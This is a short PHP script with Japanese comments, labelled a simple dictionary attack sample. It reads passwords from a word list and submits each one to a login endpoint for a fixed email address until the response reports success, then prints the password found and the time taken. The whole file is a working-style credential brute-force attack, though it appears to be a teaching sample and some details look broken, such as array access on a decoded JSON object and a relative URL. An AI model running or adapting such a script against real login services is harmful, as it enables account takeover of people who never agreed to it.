<?php
/**
 * (簡易) Dictionary Attack サンプル
 *
 * @version 1.0.0
 * @author M.Katsube <katsubemakito@gmail.com>
 */

//---------------------------------------
// 定数
//---------------------------------------
define('TARGET_URL', '/login/auth1.php');
define('USER_ID',    'foo@example.com');

// 開始時間をメモ
$start = time();

//---------------------------------------
// 辞書攻撃スタート
//---------------------------------------
$fp = fopen('password.txt', 'r');
while( ($buff = fgets($fp)) !== false ){
	$pw = trim($buff);		// 改行コードなどを削除
	$url = sprintf('%s?email=%s&password=%s', TARGET_URL, USER_ID, $pw);

	// APIを叩く
	$buff = file_get_contents($url);
	$json = json_decode($buff);

	// 判定
	if( $json['head']['status'] === true ){
		echo "HIT! $pw\n";
		break;
	}
}

//処理時間
echo "Time: ".time() - $start ."(sec)\n";
